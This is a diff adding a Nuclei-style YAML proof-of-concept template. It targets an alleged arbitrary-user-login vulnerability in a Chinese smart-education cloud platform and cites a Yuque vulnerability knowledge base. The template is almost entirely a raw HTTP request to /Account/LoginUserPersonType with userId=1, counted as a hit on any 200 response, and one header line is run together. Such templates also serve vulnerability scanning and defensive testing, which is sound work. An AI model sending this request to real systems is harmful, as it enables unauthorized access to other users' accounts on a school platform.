@@ -1,0 +1,33 @@
+id: poc-srkfye8q2rli0ywu
+info:
+  name: 东北师大理想软件股份有限公司智慧教育云平台存在任意用户登录漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/srkfye8q2rli0ywu'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: srkfye8q2rli0ywu
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /Account/LoginUserPersonType?userId=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive
+
+    sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
+
+    Gecko) Chrome/125.0.0.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
